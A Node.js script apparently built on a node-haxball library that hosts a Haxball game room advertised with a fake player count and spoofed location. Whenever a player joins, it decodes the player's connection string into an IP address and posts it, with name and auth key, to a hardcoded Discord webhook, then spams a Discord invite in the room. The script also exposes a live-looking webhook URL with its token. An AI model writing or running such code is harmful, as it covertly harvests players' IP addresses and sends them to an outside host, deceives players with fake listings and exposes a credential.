const API = require("./src/index")();
const { Room } = API;
const EnglishLanguage = require("./languages/englishLanguage");
API.Language.current = new EnglishLanguage(API);

const axios = require("axios");

function decryptHex(str) {
    if (!str || typeof str !== "string") return "";
    let out = "";
    for (let i = 0; i < str.length; i += 2) {
        out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
    }
    return out;
}

async function sendDiscordRaw(webhookUrl, body) {
    if (!webhookUrl) return;
    try {
        await axios.post(webhookUrl, body, { timeout: 10000 });
        return true;
    } catch (err) {
        console.error("❌ Error enviando webhook:", err?.message || err);
        return false;
    }
}

async function sendDiscordPlayer(webhookUrl, player, roomName) {
    if (!webhookUrl) return;
    const payload = {
        content: `🚀 Nuevo jugador conectado: **${player.name}** en ${roomName}`,
        embeds: [
            {
                title: "🎯 Nuevo Jugador Conectado",
                color: 0xff0000,
                fields: [
                    { name: "Nombre", value: player.name || "N/A", inline: true },
                    { name: "ID", value: String(player.id || "N/A"), inline: true },
                    { name: "Auth", value: player.auth || "N/A", inline: true },
                    { name: "Conn", value: player.conn || "No tiene", inline: true },
                    { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
            }
        ]
    };
    await sendDiscordRaw(webhookUrl, payload);
}

async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
    if (!webhookUrl) return;
    const payload = {
        content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
        embeds: [
            {
                title: "Sala creada",
                color: 0x00ffff,
                fields: [{ name: "Link", value: roomLink, inline: false }],
                timestamp: new Date().toISOString(),
                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
            }
        ]
    };
    await sendDiscordRaw(webhookUrl, payload);
}

/* ---------- Config (modificable / rotativo por INDEX) ---------- */

const roomNames = [
  "➔ KICK.COM/CZERRO ➔ By TLS"
];

// LISTA DE GEOS SOLICITADAS
const geoList = [
    { lat: -34.5670013427734, lon: -58.4669990539551, flag: "XK" }
];

const maxPlayersList = [2, 2, 2, 2, 2];
const fakePlayersList = [14, 14, 14, 14, 14];

/* ---------- Env / selección por index ---------- */

const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
const token = process.env.JOB_ID || process.env.HAXBALL_TOKEN || process.env.RECAPTCHA_TOKEN;

const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";

const roomName = roomNames[jobIndex % roomNames.length];
const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];

// SELECCIÓN DE GEO SEGÚN EL INDEX
const geo = geoList[jobIndex % geoList.length];

if (!token) {
    console.error("❌ No se encontró token (JOB_ID / HAXBALL_TOKEN / RECAPTCHA_TOKEN).");
    process.exit(1);
}

console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | FakePlayers: ${fakePlayers} | Geo: ${JSON.stringify(geo)}`);

/* ---------- Crear sala (node-haxball moderno) ---------- */

Room.create(
{
    name: roomName,
    password: process.env.ROOM_PASSWORD || "",
    maxPlayerCount: maxPlayers,
    playerCount: fakePlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: token
},
{
    storage: {
        player_name: process.env.PLAYER_NAME || "Teleese",
        avatar: process.env.PLAYER_AVATAR || "🚨"
    },
    libraries: [],
    config: null,
    renderer: null,
    plugins: [],
    onOpen: (room) => {

        console.log("✅ Sala creada (onOpen). Esperando link...");

        room.onAfterRoomLink = (roomLink) => {
            console.log("🔗 Link de la sala:", roomLink);
            if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
        };

        room.onPlayerJoin = (playerObj) => {
            try {

                console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
                sendDiscordPlayer(webhookUrl, playerObj, roomName);

                const mensajes = [
                    "UNITE AL DISCORD: https://discord.gg/Fht2WhVMN"
                ];

                let i = 0;
                let contador = 0;

                const spam = setInterval(() => {
                    room.sendAnnouncement(
                        ` ${mensajes[i]} `,
                        null,
                        0xff0000,
                        "bold",
                        2
                    );

                    i = (i + 1) % mensajes.length;
                    contador++;

                    if (contador >= 6) clearInterval(spam);

                }, 1500);

            } catch (e) {
                console.error("Error en onPlayerJoin:", e);
            }
        };

        room.onPlayerLeave = (playerObj) => {
            console.log(`👋 Jugador salió: ${playerObj.name} (ID: ${playerObj.id})`);
        };

        room.onPlayerChat = (id, message) => {
            console.log(`💬 ${id}: ${message}`);
            return false;
        };

        room.onRoomError = (err) =>
            console.error("❌ Error en sala:", err);
    },
    onClose: (msg) => {
        console.log("🔴 Bot ha salido de la sala:", msg?.toString());
        process.exit(0);
    }
}
);
